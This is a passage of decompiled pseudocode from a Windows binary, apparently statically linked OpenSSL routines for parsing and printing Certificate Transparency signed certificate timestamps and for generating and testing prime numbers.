    v8 = v3 - 43;
    v9 = sub_424800(v7, 0x20u);
    v4[3] = v9;
    if ( !v9 )
      goto LABEL_21;
    v10 = v7 + 32;
    v4[4] = (void *)32;
    v4[7] = (void *)(*v10 << 24);
    v4[6] = 0;
    v11 = v10[1];
    v4[6] = v4[6];
    v4[7] = (void *)((v11 << 16) | (unsigned int)v4[7]);
    v12 = (++v10)[1];
    v4[6] = v4[6];
    ++v10;
    v4[7] = (void *)((v12 << 8) | (unsigned int)v4[7]);
    v13 = v10[1];
    v4[6] = v4[6];
    v4[7] = (void *)(v13 | (unsigned int)v4[7]);
    v14 = (++v10)[1];
    ++v10;
    *((_QWORD *)v4 + 3) |= (__int64)v14 << 24;
    v15 = *++v10;
    *((_QWORD *)v4 + 3) |= (__int64)v15 << 16;
    v16 = *++v10;
    *((_QWORD *)v4 + 3) |= (__int64)v16 << 8;
    v17 = *++v10;
    *((_QWORD *)v4 + 3) |= v17;
    v18 = v10[2] | (v10[1] << 8);
    v19 = v10 + 3;
    if ( v8 < v18 )
    {
      sub_408310(50, 110, 104, (int)"crypto\\ct\\ct_oct.c", 114);
      goto LABEL_21;
    }
    if ( v18 )
    {
      v20 = sub_424800(v19, v18);
      v4[8] = v20;
      if ( !v20 )
        goto LABEL_21;
    }
    v21 = v8 - v18;
    v4[9] = (void *)v18;
    Size = (size_t)v19 + v18;
    v22 = sub_4CFBA0((int)v4, (_BYTE **)&Size, v21);
    if ( v22 <= 0 )
    {
      sub_408310(50, 110, 104, (int)"crypto\\ct\\ct_oct.c", 128);
      goto LABEL_21;
    }
    *a2 = (void *)(v21 + Size - v22);
  }
  if ( a1 )
  {
    sub_4D65A0(*a1);
    *a1 = v4;
  }
  return v4;
}

//----- (004CFE60) --------------------------------------------------------
int __cdecl sub_4CFE60(int a1, _BYTE **a2)
{
  size_t v2; // edi
  _BYTE *v3; // eax
  _BYTE *v5; // eax

  if ( !sub_4D66C0(a1) )
  {
    sub_408310(50, 109, 107, (int)"crypto\\ct\\ct_oct.c", 159);
LABEL_10:
    sub_413490(0);
    return -1;
  }
  if ( *(_DWORD *)a1 )
  {
    sub_408310(50, 109, 103, (int)"crypto\\ct\\ct_oct.c", 164);
    goto LABEL_10;
  }
  v2 = *(_DWORD *)(a1 + 48) + 4;
  if ( a2 )
  {
    v3 = *a2;
    if ( *a2 )
    {
      *a2 = &v3[v2];
    }
    else
    {
      v3 = sub_4133F0(v2);
      if ( !v3 )
      {
        sub_408310(50, 109, 65, (int)"crypto\\ct\\ct_oct.c", 182);
        goto LABEL_10;
      }
      *a2 = v3;
    }
    *v3 = *(_BYTE *)(a1 + 40);
    v3[1] = *(_BYTE *)(a1 + 41);
    v5 = v3 + 2;
    *v5 = *(_BYTE *)(a1 + 49);
    v5[1] = *(_BYTE *)(a1 + 48);
    memcpy(v5 + 2, *(const void **)(a1 + 44), *(_DWORD *)(a1 + 48));
  }
  return v2;
}

//----- (004CFF40) --------------------------------------------------------
int __cdecl sub_4CFF40(int a1, _BYTE **a2)
{
  _BYTE *v2; // ebx
  size_t v3; // esi
  _BYTE *v4; // eax
  void *v5; // edi
  _BYTE *v6; // ebx
  _BYTE *v7; // ebx
  bool v8; // zf
  _BYTE *v10; // [esp+10h] [ebp-8h] BYREF
  size_t v11; // [esp+14h] [ebp-4h]

  v2 = 0;
  if ( !sub_4D6700((_DWORD *)a1) )
  {
    sub_408310(50, 107, 106, (int)"crypto\\ct\\ct_oct.c", 206);
LABEL_17:
    sub_413490(v2);
    return -1;
  }
  if ( *(_DWORD *)a1 )
  {
    v11 = *(_DWORD *)(a1 + 8);
    v3 = v11;
  }
  else
  {
    v3 = *(_DWORD *)(a1 + 48) + *(_DWORD *)(a1 + 36) + 47;
    v11 = v3;
  }
  if ( a2 )
  {
    v2 = *a2;
    if ( *a2 )
    {
      *a2 = &v2[v3];
    }
    else
    {
      v4 = sub_4133F0(v3);
      v2 = v4;
      if ( !v4 )
      {
        sub_408310(50, 107, 65, (int)"crypto\\ct\\ct_oct.c", 229);
        goto LABEL_17;
      }
      *a2 = v4;
    }
    if ( *(_DWORD *)a1 )
    {
      memcpy(v2, *(const void **)(a1 + 4), v3);
      return v3;
    }
    *v2 = *(_BYTE *)a1;
    v5 = v2 + 1;
    v6 = v2 + 33;
    qmemcpy(v5, *(const void **)(a1 + 12), 0x20u);
    *v6 = *(_BYTE *)(a1 + 31);
    *++v6 = *(_BYTE *)(a1 + 30);
    *++v6 = *(_BYTE *)(a1 + 29);
    *++v6 = *(_BYTE *)(a1 + 28);
    *++v6 = *(_BYTE *)(a1 + 27);
    *++v6 = *(_BYTE *)(a1 + 26);
    *++v6 = *(_BYTE *)(a1 + 25);
    v6[1] = *(_BYTE *)(a1 + 24);
    v6 += 2;
    *v6 = *(_BYTE *)(a1 + 37);
    v6[1] = *(_BYTE *)(a1 + 36);
    v7 = v6 + 2;
    v8 = *(_DWORD *)(a1 + 36) == 0;
    v10 = v7;
    if ( !v8 )
    {
      memcpy(v7, *(const void **)(a1 + 32), *(_DWORD *)(a1 + 36));
      v10 = &v7[*(_DWORD *)(a1 + 36)];
    }
    if ( sub_4CFE60(a1, &v10) <= 0 )
    {
      v2 = v10;
      goto LABEL_17;
    }
    return v11;
  }
  return v3;
}

//----- (004D00E0) --------------------------------------------------------
void __cdecl sub_4D00E0(void *Block)
{
  sub_426C00(Block, (void (__cdecl *)(_DWORD))sub_4D65A0);
}

//----- (004D0100) --------------------------------------------------------
int *__cdecl sub_4D0100(int **a1, void **a2, int a3)
{
  unsigned int v3; // esi
  int **v5; // edi
  int *v6; // ebp
  void **i; // eax
  unsigned int v8; // eax
  unsigned int v9; // esi
  void **v10; // eax
  void **v11; // edi

  if ( (unsigned int)(a3 - 2) > 0xFFFD )
  {
    sub_408310(50, 111, 105, (int)"crypto\\ct\\ct_oct.c", 269);
    return 0;
  }
  else
  {
    v3 = *((unsigned __int8 *)*a2 + 1) | (*(unsigned __int8 *)*a2 << 8);
    *a2 = (char *)*a2 + 2;
    if ( v3 != a3 - 2 )
    {
      sub_408310(50, 111, 105, (int)"crypto\\ct\\ct_oct.c", 275);
      return 0;
    }
    v5 = a1;
    if ( a1 && *a1 )
    {
      v6 = *a1;
      for ( i = (void **)sub_4269D0(*a1); i; i = (void **)sub_4269D0(v6) )
        sub_4D65A0(i);
    }
    else
    {
      v6 = sub_426AF0();
      if ( !v6 )
        return 0;
    }
    if ( v3 )
    {
      while ( 1 )
      {
        if ( v3 < 2 )
        {
          sub_408310(50, 111, 105, (int)"crypto\\ct\\ct_oct.c", 296);
          goto LABEL_24;
        }
        v8 = *((unsigned __int8 *)*a2 + 1) | (*(unsigned __int8 *)*a2 << 8);
        v9 = v3 - 2;
        *a2 = (char *)*a2 + 2;
        if ( !v8 || v8 > v9 )
          break;
        v3 = v9 - v8;
        v10 = sub_4CFC90(0, a2, v8);
        v11 = v10;
        if ( !v10 )
          goto LABEL_23;
        if ( !sub_4269B0(v6, (int)v10) )
        {
          sub_4D65A0(v11);
LABEL_23:
          v5 = a1;
          goto LABEL_24;
        }
        v5 = a1;
        if ( !v3 )
          goto LABEL_17;
      }
      sub_408310(50, 111, 105, (int)"crypto\\ct\\ct_oct.c", 303);
LABEL_24:
      if ( !v5 || !*v5 )
        sub_426C00(v6, (void (__cdecl *)(_DWORD))sub_4D65A0);
      return 0;
    }
LABEL_17:
    if ( v5 )
    {
      if ( !*v5 )
        *v5 = v6;
    }
    return v6;
  }
}

//----- (004D0270) --------------------------------------------------------
int __cdecl sub_4D0270(int *a1, void **a2)
{
  void **v2; // ebp
  int v3; // esi
  _BYTE *v4; // edi
  size_t v5; // eax
  int result; // eax
  void *v7; // eax
  _BYTE *v8; // ebp
  int v9; // eax
  int v10; // eax
  _DWORD *v11; // ebp
  int v12; // ebp
  _BYTE *v13; // ecx
  unsigned int v14; // [esp+10h] [ebp-Ch]
  int v15; // [esp+14h] [ebp-8h]
  _BYTE *v16; // [esp+18h] [ebp-4h] BYREF

  v2 = a2;
  v3 = 0;
  v4 = 0;
  v15 = 0;
  if ( a2 )
  {
    if ( !*a2 )
    {
      v5 = sub_4D0270(a1, 0);
      if ( v5 == -1 )
      {
        sub_408310(50, 108, 105, (int)"crypto\\ct\\ct_oct.c", 335);
        return -1;
      }
      v7 = sub_4133F0(v5);
      *a2 = v7;
      if ( !v7 )
      {
        sub_408310(50, 108, 65, (int)"crypto\\ct\\ct_oct.c", 339);
        return -1;
      }
      v15 = 1;
    }
    v4 = (char *)*a2 + 2;
  }
  v14 = 2;
  if ( sub_426A30((int)a1) <= 0 )
  {
    result = 2;
LABEL_27:
    if ( v2 )
    {
      v13 = *v2;
      *v13 = (unsigned __int16)(result - 2) >> 8;
      v13[1] = result - 2;
      if ( !v15 )
        *v2 = (char *)*v2 + result;
    }
  }
  else
  {
    while ( 1 )
    {
      if ( v2 )
      {
        v8 = v4;
        v16 = v4 + 2;
        v9 = sub_426A40(a1, v3);
        v10 = sub_4CFF40(v9, &v16);
        if ( v10 == -1 )
          goto LABEL_22;
        v4 = v16;
        *v8 = BYTE1(v10);
        v8[1] = v10;
      }
      else
      {
        v11 = (_DWORD *)sub_426A40(a1, v3);
        if ( !sub_4D6700(v11) )
        {
          sub_408310(50, 107, 106, (int)"crypto\\ct\\ct_oct.c", 206);
          sub_413490(0);
          goto LABEL_22;
        }
        if ( *v11 )
          v12 = v11[2];
        else
          v12 = v11[12] + v11[9] + 47;
        v10 = v12;
        if ( v12 == -1 )
          goto LABEL_22;
      }
      v14 += v10 + 2;
      if ( ++v3 >= sub_426A30((int)a1) )
        break;
      v2 = a2;
    }
    result = v14;
    if ( v14 <= 0xFFFF )
    {
      v2 = a2;
      goto LABEL_27;
    }
LABEL_22:
    if ( v15 )
    {
      sub_413490(*a2);
      *a2 = 0;
    }
    return -1;
  }
  return result;
}

//----- (004D0460) --------------------------------------------------------
int __cdecl sub_4D0460(int **a1, _DWORD *a2, int a3)
{
  int v3; // ebx
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  int result; // eax
  int *v7; // esi
  void *Block; // [esp+8h] [ebp-4h] BYREF

  v3 = a3;
  v4 = a2;
  v5 = (_DWORD *)*a2;
  Block = 0;
  a2 = v5;
  result = sub_42C3F0((int *)&Block, (void **)&a2, a3);
  if ( result )
  {
    a2 = (_DWORD *)*((_DWORD *)Block + 2);
    v7 = sub_4D0100(a1, (void **)&a2, *(_DWORD *)Block);
    if ( v7 )
      *v4 += v3;
    sub_42C4F0(Block);
    return (int)v7;
  }
  return result;
}

//----- (004D04E0) --------------------------------------------------------
int __cdecl sub_4D04E0(int *a1, void **a2)
{
  int result; // eax
  signed int v3; // esi
  int v4; // [esp+0h] [ebp-10h] BYREF
  void *Block; // [esp+8h] [ebp-8h] BYREF

  Block = 0;
  result = sub_4D0270(a1, &Block);
  v4 = result;
  if ( result != -1 )
  {
    v3 = sub_42C410((int)&v4, a2);
    sub_413490(Block);
    return v3;
  }
  return result;
}

//----- (004D0550) --------------------------------------------------------
int *__cdecl sub_4D0550(unsigned __int64 a1, int a2)
{
  int *result; // eax
  int *v3; // esi
  int v4; // eax
  char Src[20]; // [esp+10h] [ebp-18h] BYREF

  result = sub_42C550();
  v3 = result;
  if ( result )
  {
    sub_44C190(result, 0i64, a1 / 0x5265C00, a1 % 0x5265C00 / 0x3E8);
    v4 = sub_432B60((int)v3);
    sub_4191B0((int)Src, 20, "%.14s.%03dZ", v4);
    if ( sub_44C110((int)v3, Src) )
      sub_44C2C0(a2, v3);
    return (int *)sub_42C4F0(v3);
  }
  return result;
}

//----- (004D0630) --------------------------------------------------------
int __cdecl sub_4D0630(int a1, int a2, int a3, int **a4)
{
  int v4; // ebx
  const char *v6; // eax
  int v7; // ebp
  int v8; // eax
  char *v9; // [esp-8h] [ebp-1Ch]
  int v10; // [esp+10h] [ebp-4h]

  v10 = 0;
  if ( a4 )
    v10 = sub_4D6740(a4, *(_BYTE **)(a1 + 12), *(_DWORD *)(a1 + 16));
  sub_419190(a2, "%*sSigned Certificate Timestamp:", a3, byte_4F1291);
  v4 = a3 + 4;
  sub_419190(a2, "\n%*sVersion   : ", a3 + 4, byte_4F1291);
  if ( *(_DWORD *)a1 )
  {
    sub_419190(a2, "unknown\n%*s", a3 + 16, byte_4F1291);
    return sub_439DF0(a2, a3 + 16, 16, *(_DWORD *)(a1 + 4), *(_DWORD *)(a1 + 8));
  }
  else
  {
    sub_419190(a2, "v1 (0x0)");
    if ( v10 )
    {
      v6 = (const char *)sub_435D30(v10);
      sub_419190(a2, "\n%*sLog       : %s", a3 + 4, byte_4F1291, v6);
    }
    sub_419190(a2, "\n%*sLog ID    : ", a3 + 4, byte_4F1291);
    v7 = a3 + 16;
    sub_439DF0(a2, a3 + 16, 16, *(_DWORD *)(a1 + 12), *(_DWORD *)(a1 + 16));
    sub_419190(a2, "\n%*sTimestamp : ", v4, byte_4F1291);
    sub_4D0550(*(_QWORD *)(a1 + 24), a2);
    sub_419190(a2, "\n%*sExtensions: ", v4, byte_4F1291);
    if ( *(_DWORD *)(a1 + 36) )
      sub_439DF0(a2, v7, 16, *(_DWORD *)(a1 + 32), *(_DWORD *)(a1 + 36));
    else
      sub_419190(a2, "none");
    sub_419190(a2, "\n%*sSignature : ", v4, byte_4F1291);
    v8 = sub_4D6690(a1);
    if ( v8 )
    {
      v9 = sub_423440(v8);
      sub_419190(a2, "%s", v9);
    }
    else
    {
      sub_419190(a2, "%02X%02X", *(unsigned __int8 *)(a1 + 40), *(unsigned __int8 *)(a1 + 41));
    }
    sub_419190(a2, "\n%*s            ", v4, byte_4F1291);
    return sub_439DF0(a2, v7, 16, *(_DWORD *)(a1 + 44), *(_DWORD *)(a1 + 48));
  }
}

//----- (004D07F0) --------------------------------------------------------
int __cdecl sub_4D07F0(int *a1, int a2, int a3, const char *a4, int **a5)
{
  int result; // eax
  int v6; // esi
  int v7; // eax
  int i; // [esp+8h] [ebp-4h]

  result = sub_426A30((int)a1);
  v6 = 0;
  for ( i = result; v6 < i; ++v6 )
  {
    v7 = sub_426A40(a1, v6);
    sub_4D0630(v7, a2, a3, a5);
    result = sub_426A30((int)a1) - 1;
    if ( v6 < result )
      result = sub_419190(a2, "%s", a4);
  }
  return result;
}

//----- (004D0870) --------------------------------------------------------
int __cdecl sub_4D0870(int a1, int *a2)
{
  int *v2; // edi
  int v3; // ebx
  int v5; // esi
  int v6; // eax

  v2 = a2;
  v3 = 0;
  if ( !a2 )
    return 0;
  if ( *a2 )
  {
    v5 = 0;
    if ( *a2 <= 0 )
      return v3;
    while ( 1 )
    {
      if ( v5 && !(v5 % 35) )
      {
        if ( sub_405110(a1, (int)"\\\n", 2) != 2 )
          return -1;
        v3 += 2;
      }
      v6 = v2[2];
      LOBYTE(a2) = off_5356DC[*(unsigned __int8 *)(v6 + v5) >> 4];
      BYTE1(a2) = off_5356DC[*(_BYTE *)(v5 + v6) & 0xF];
      if ( sub_405110(a1, (int)&a2, 2) != 2 )
        break;
      ++v5;
      v3 += 2;
      if ( v5 >= *v2 )
        return v3;
    }
  }
  else if ( sub_405110(a1, (int)"0", 1) == 1 )
  {
    return 1;
  }
  return -1;
}
// 5356DC: using guessed type char *off_5356DC;

//----- (004D0950) --------------------------------------------------------
int __cdecl sub_4D0950(_DWORD *a1, int a2, int a3)
{
  void (__cdecl *v4)(int, int, _DWORD); // ecx

  if ( !a1 )
    return 1;
  if ( *a1 == 1 )
  {
    v4 = (void (__cdecl *)(int, int, _DWORD))a1[2];
    if ( v4 )
      v4(a2, a3, a1[1]);
    return 1;
  }
  if ( *a1 == 2 )
    return ((int (__cdecl *)(int, int, _DWORD *))a1[2])(a2, a3, a1);
  else
    return 0;
}

//----- (004D09A0) --------------------------------------------------------
int __usercall sub_4D09A0@<eax>(
        _DWORD *a1@<ecx>,
        int *a2@<ebx>,
        int *a3@<edi>,
        unsigned int *a4@<esi>,
        __m64 a5@<mm0>,
        _DWORD *a6,
        int a7,
        void *a8)
{
  int v9; // ebp

  if ( !sub_427DE0(a5, a4, (int *)a4, a1, (int)a2, a3, a8) )
    return -1;
  if ( sub_416DC0((int)a4) || !sub_4169B0(a4, a6) )
    return 0;
  v9 = a7 - 1;
  if ( a7 != 1 )
  {
    while ( sub_42A430(a4, (int *)a4, (unsigned int **)a4, a2, a3) )
    {
      if ( sub_416DC0((int)a4) )
        return 1;
      if ( !sub_4169B0(a4, a6) )
        return 0;
      if ( !--v9 )
        return 1;
    }
    return -1;
  }
  return 1;
}

//----- (004D0A30) --------------------------------------------------------
int __cdecl sub_4D0A30(int *a1, int a2, int a3)
{
  int *v3; // ebx
  int v4; // edi
  _WORD *v5; // esi
  int v6; // eax
  int v7; // eax
  unsigned int v8; // edx
  unsigned int v9; // ebp
  unsigned int v10; // ebx
  unsigned __int16 *v11; // ecx
  unsigned __int16 *i; // edi
  unsigned int v13; // esi
  unsigned __int16 *v14; // ecx
  unsigned __int16 *v15; // esi
  unsigned int v17; // [esp+14h] [ebp-4h]

  v17 = -17864;
LABEL_2:
  v3 = a1;
  if ( sub_42A7D0(a1, a2, 1, 1) )
  {
    v4 = 1;
    v5 = (_WORD *)(a3 + 2);
    while ( 1 )
    {
      v6 = sub_437EB0(a1, *(unsigned __int16 *)((char *)&unk_52ADF8 + (_DWORD)v5 - a3));
      if ( v6 == -1 )
        break;
      *v5 = v6;
      ++v4;
      ++v5;
      if ( v4 >= 2048 )
      {
        if ( a2 <= 32 )
        {
          v7 = sub_416940(a1);
          if ( a2 == 32 )
            v8 = -1 - v7;
          else
            v8 = (1 << a2) - v7 - 1;
          if ( v8 < v17 )
            v17 = v8;
        }
        v9 = 0;
LABEL_13:
        while ( a2 <= 32 )
        {
          v10 = sub_416940(v3);
          v11 = (unsigned __int16 *)&unk_52ADFA;
          for ( i = (unsigned __int16 *)(a3 + 2); ; ++i )
          {
            if ( (int)v11 >= (int)&unk_52BDF8 || (v13 = *v11, v13 >= v10) )
            {
              v3 = a1;
              goto LABEL_28;
            }
            if ( !((v9 + *i) % v13) )
              break;
            ++v11;
          }
          v9 += 2;
          if ( v9 > v17 )
            goto LABEL_2;
          v3 = a1;
        }
        v14 = (unsigned __int16 *)&unk_52ADFA;
        v15 = (unsigned __int16 *)(a3 + 2);
        while ( (int)v14 < (int)&unk_52BDF8 )
        {
          if ( (v9 + *v15) % *v14 <= 1 )
          {
            v9 += 2;
            if ( v9 <= v17 )
              goto LABEL_13;
            goto LABEL_2;
          }
          ++v15;
          ++v14;
        }
LABEL_28:
        if ( !sub_437FD0(v3, v9) )
          return 0;
        if ( sub_416F90(v3) == a2 )
          return 1;
        goto LABEL_2;
      }
    }
  }
  return 0;
}

//----- (004D0BC0) --------------------------------------------------------
int __cdecl sub_4D0BC0(int *a1, int a2, int *a3, int a4, int *a5)
{
  _DWORD *v5; // esi
  unsigned __int16 *i; // esi
  unsigned int v8; // eax
  int v10; // [esp+8h] [ebp-4h]

  v10 = 0;
  sub_420700(a5);
  v5 = sub_420790(a5);
  if ( v5 && sub_42A7D0(a1, a2, 0, 1) && sub_4299A0(0, (int)v5, a1, a3, a5) && sub_422020(a1, (int)a1, (int)v5) )
  {
    if ( a4 ? sub_4220E0(a1, (int)a1, a4) : sub_437FD0(a1, 1) )
    {
      while ( 2 )
      {
        for ( i = (unsigned __int16 *)&unk_52ADFA; ; ++i )
        {
          if ( (int)i >= (int)&unk_52BDF8 )
          {
            v10 = 1;
            goto LABEL_17;
          }
          v8 = sub_437EB0(a1, *i);
          if ( v8 == -1 )
            goto LABEL_17;
          if ( v8 <= 1 )
            break;
        }
        if ( sub_4220E0(a1, (int)a1, (int)a3) )
          continue;
        break;
      }
    }
  }
LABEL_17:
  sub_420750(a5);
  return v10;
}

//----- (004D0CD0) --------------------------------------------------------
int __cdecl sub_4D0CD0(int **a1, int a2, int *a3, int *a4, int *a5)
{
  int *v5; // esi
  int *v6; // ebx
  int *v7; // edi
  int v8; // eax
  unsigned __int16 *i; // esi
  int v10; // edi
  int v11; // eax
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v13 = 0;
  sub_420700(a5);
  v5 = sub_420790(a5);
  v6 = sub_420790(a5);
  v7 = sub_420790(a5);
  v14 = (int)v7;
  if ( v7
    && sub_437B50(v7, a3)
    && sub_42A7D0(v6, a2 - 1, 0, 1)
    && sub_4299A0(0, (int)v5, v6, v7, a5)
    && sub_422020(v6, (int)v6, (int)v5) )
  {
    if ( a4 )
    {
      if ( !sub_437B50(v5, a4) )
        goto LABEL_24;
      v8 = sub_4220E0(v6, (int)v6, (int)v5);
    }
    else
    {
      v8 = sub_437FD0(v6, 1);
    }
    if ( v8 && sub_437AC0(a1, (int **)v6) && sub_437FD0((int *)a1, 1) )
    {
      do
      {
        for ( i = (unsigned __int16 *)&unk_52ADFA; ; ++i )
        {
          if ( (int)i >= (int)&unk_52BDF8 )
          {
            v13 = 1;
            goto LABEL_24;
          }
          v10 = sub_437EB0(a1, *i);
          v11 = sub_437EB0(v6, *i);
          if ( v10 == -1 || v11 == -1 )
            goto LABEL_24;
          if ( !v10 || !v11 )
            break;
        }
      }
      while ( sub_4220E0(a1, (int)a1, (int)a3) && sub_4220E0(v6, (int)v6, v14) );
    }
  }
LABEL_24:
  sub_420750(a5);
  return v13;
}

//----- (004D0E70) --------------------------------------------------------
int __usercall sub_4D0E70@<eax>(__m64 a1@<mm0>, int *a2, int a3, int *Block, int a5, _DWORD *a6)
{
  void **v6; // eax
  unsigned __int16 *v8; // esi
  int v9; // eax
  int *v10; // edi
  int *v11; // eax
  int *v12; // esi
  void (__cdecl *v13)(int, int, _DWORD); // ecx
  unsigned int **v14; // ebp
  int *v15; // esi
  int v16; // ebx
  _DWORD *v17; // eax
  int v18; // eax
  int v19; // ebx
  int *v20; // [esp+8h] [ebp-18h]
  _DWORD *v21; // [esp+Ch] [ebp-14h]
  int v22; // [esp+10h] [ebp-10h]
  int v23; // [esp+14h] [ebp-Ch]
  unsigned int **v24; // [esp+18h] [ebp-8h]
  int v25; // [esp+1Ch] [ebp-4h]

  v22 = -1;
  v21 = 0;
  v6 = sub_416820();
  if ( sub_4169B0(a2, v6) <= 0 )
    return 0;
  if ( !a3 )
  {
    if ( sub_416F90(a2) < 1300 )
    {
      if ( sub_416F90(a2) < 850 )
      {
        if ( sub_416F90(a2) < 650 )
        {
          if ( sub_416F90(a2) < 550 )
          {
            if ( sub_416F90(a2) < 450 )
            {
              if ( sub_416F90(a2) < 400 )
              {
                if ( sub_416F90(a2) < 350 )
                {
                  if ( sub_416F90(a2) < 300 )
                  {
                    if ( sub_416F90(a2) < 250 )
                    {
                      if ( sub_416F90(a2) < 200 )
                        a3 = sub_416F90(a2) < 150 ? 27 : 18;
                      else
                        a3 = 15;
                    }
                    else
                    {
                      a3 = 12;
                    }
                  }
                  else
                  {
                    a3 = 9;
                  }
                }
                else
                {
                  a3 = 8;
                }
              }
              else
              {
                a3 = 7;
              }
            }
            else
            {
              a3 = 6;
            }
          }
          else
          {
            a3 = 5;
          }
        }
        else
        {
          a3 = 4;
        }
      }
      else
      {
        a3 = 3;
      }
    }
    else
    {
      a3 = 2;
    }
  }
  if ( !sub_416E20((int)a2) )
    return sub_416DE0((int)a2, 2);
  if ( a5 )
  {
    v8 = (unsigned __int16 *)&unk_52ADFA;
    while ( 1 )
    {
      v9 = sub_437EB0(a2, *v8);
      if ( v9 == -1 )
        goto LABEL_69;
      if ( !v9 )
        return 0;
      if ( (int)++v8 >= (int)&unk_52BDF8 )
      {
        if ( !a6 )
          break;
        if ( *a6 == 1 )
        {
          v13 = (void (__cdecl *)(int, int, _DWORD))a6[2];
          if ( v13 )
            v13(1, -1, a6[1]);
        }
        else if ( *a6 != 2 || !((int (__cdecl *)(int, int, _DWORD *))a6[2])(1, -1, a6) )
        {
          goto LABEL_69;
        }
        break;
      }
    }
  }
  v10 = Block;
  if ( Block || (v10 = sub_420670()) != 0 )
  {
    sub_420700(v10);
    if ( a2[3] )
    {
      v11 = sub_420790(v10);
      v12 = v11;
      if ( !v11 )
      {
LABEL_66:
        if ( v10 )
        {
          sub_420750(v10);
          if ( !Block )
            sub_4206C0((void **)v10);
        }
        goto LABEL_69;
      }
      sub_4173E0(v11, a2);
      v12[3] = 0;
      v20 = v12;
    }
    else
    {
      v20 = a2;
    }
    v14 = (unsigned int **)sub_420790(v10);
    v24 = (unsigned int **)sub_420790(v10);
    v15 = sub_420790(v10);
    if ( v15 && sub_4173E0(v14, v20) && sub_438090((int *)v14, 1u) )
    {
      if ( sub_416DB0((int)v14) )
      {
LABEL_49:
        v22 = 0;
      }
      else
      {
        v16 = 1;
        v23 = 1;
        if ( !sub_416A50(v14, 1) )
        {
          do
            ++v16;
          while ( !sub_416A50(v14, v16) );
          v23 = v16;
        }
        if ( sub_437D40(v24, v14, v16) )
        {
          v17 = sub_4289A0();
          v21 = v17;
          if ( v17 )
          {
            if ( sub_4285F0(v17, (int **)v20, v10) )
            {
              v25 = 0;
              if ( a3 <= 0 )
              {
LABEL_65:
                v22 = 1;
              }
              else
              {
                while ( sub_42A990(v15, v14) )
                {
                  if ( !sub_437FD0(v15, 1) )
                    break;
                  v18 = sub_4D09A0(v24, v20, v10, (unsigned int *)v15, a1, v14, v16, v21);
                  if ( v18 == -1 )
                    break;
                  if ( v18 )
                    goto LABEL_49;
                  v19 = v25;
                  if ( !sub_4D0950(a6, 1, v25) )
                    break;
                  ++v25;
                  if ( v19 + 1 >= a3 )
                    goto LABEL_65;
                  v16 = v23;
                }
              }
            }
          }
        }
      }
    }
    goto LABEL_66;
  }
LABEL_69:
  sub_4285A0(v21);
  return v22;
}

//----- (004D1260) --------------------------------------------------------
int __usercall sub_4D1260@<eax>(__m64 a1@<mm0>, int **a2, int a3, int a4, int *a5, int *a6, _DWORD *a7)
{
  int v7; // ebp
  int *v8; // esi
  int *v10; // eax
  int v11; // eax
  int v13; // eax
  int i; // ebp
  int v15; // eax
  int v16; // eax
  int v17; // [esp+Ch] [ebp-14h]
  int v18; // [esp+10h] [ebp-10h]
  int *v19; // [esp+14h] [ebp-Ch]
  void *Block; // [esp+18h] [ebp-8h]
  int v21; // [esp+1Ch] [ebp-4h]

  v7 = a3;
  v8 = 0;
  v21 = 0;
  v18 = 0;
  if ( a3 < 1300 )
  {
    if ( a3 < 850 )
    {
      if ( a3 < 650 )
      {
        if ( a3 < 550 )
        {
          if ( a3 < 450 )
          {
            if ( a3 < 400 )
            {
              if ( a3 < 350 )
              {
                if ( a3 < 300 )
                {
                  if ( a3 < 250 )
                  {
                    if ( a3 < 200 )
                      v17 = a3 < 150 ? 27 : 18;
                    else
                      v17 = 15;
                  }
                  else
                  {
                    v17 = 12;
                  }
                }
                else
                {
                  v17 = 9;
                }
              }
              else
              {
                v17 = 8;
              }
            }
            else
            {
              v17 = 7;
            }
          }
          else
          {
            v17 = 6;
          }
        }
        else
        {
          v17 = 5;
        }
      }
      else
      {
        v17 = 4;
      }
    }
    else
    {
      v17 = 3;
    }
  }
  else
  {
    v17 = 2;
  }
  if ( a3 < 2 )
  {
    sub_408310(3, 141, 118, (int)"crypto\\bn\\bn_prime.c", 113);
    return 0;
  }
  if ( a3 == 2 && a4 )
  {
    sub_408310(3, 141, 118, (int)"crypto\\bn\\bn_prime.c", 117);
    return 0;
  }
  Block = sub_413430(0x1000u);
  if ( Block )
  {
    v10 = sub_420670();
    v8 = v10;
    if ( v10 )
    {
      sub_420700(v10);
      v19 = sub_420790(v8);
      if ( v19 )
      {
LABEL_33:
        while ( 1 )
        {
          if ( a5 )
            v11 = a4 ? sub_4D0CD0(a2, v7, a5, a6, v8) : sub_4D0BC0((int *)a2, v7, a5, (int)a6, v8);
          else
            v11 = sub_4D0A30((int *)a2, v7, (int)Block);
          if ( !v11 )
            break;
          if ( !sub_4D0950(a7, 0, v18++) )
            break;
          if ( a4 )
          {
            if ( sub_437B50(v19, (int *)a2) )
            {
              for ( i = 0; i < v17; ++i )
              {
                v15 = sub_4D0E70(a1, (int *)a2, 1, v8, 0, a7);
                if ( v15 == -1 )
                  goto LABEL_44;
                if ( !v15 )
                  goto LABEL_32;
                v16 = sub_4D0E70(a1, v19, 1, v8, 0, a7);
                if ( v16 == -1 )
                  goto LABEL_44;
                if ( !v16 )
                {
LABEL_32:
                  v7 = a3;
                  goto LABEL_33;
                }
                if ( !sub_4D0950(a7, 2, v18 - 1) )
                  goto LABEL_44;
              }
LABEL_43:
              v21 = 1;
              break;
            }
            break;
          }
          v13 = sub_4D0E70(a1, (int *)a2, v17, v8, 0, a7);
          if ( v13 == -1 )
            break;
          if ( v13 )
            goto LABEL_43;
        }
      }
    }
  }
LABEL_44:
  sub_413490(Block);
  if ( v8 )
    sub_420750(v8);
  sub_4206C0((void **)v8);
  return v21;
}

//----- (004D1540) --------------------------------------------------------
void sub_4D1540()
{
  ;
}

//----- (004D1680) --------------------------------------------------------
int __usercall sub_4D1680@<eax>(int a1@<eax>, unsigned int a2@<ebx>)
{
  int v2; // edx
  int v3; // ecx
  int v4; // edx
  int v5; // edx
  int v6; // ecx
  int v7; // esi
  unsigned int v8; // ebx
  int v9; // edi
  int v10; // eax
  int v11; // esi
  int v12; // ebp
  int v13; // edi
  int v14; // ecx
  int v15; // esi
  int v16; // eax
  int v17; // ebp
  int v18; // edi
  int v19; // ecx
  int v20; // esi
  int v22[9]; // [esp+0h] [ebp-24h]

  v22[0] = 0;
  v2 = (2 * a1) & 0x7FFFFFFF;
  v22[1] = a1 & 0x3FFFFFFF;
  v3 = v2 ^ a1 & 0x3FFFFFFF;
  v22[2] = v2;
  v4 = (4 * a1) ^ v2;
  v22[3] = v3;
  v22[4] = 4 * a1;
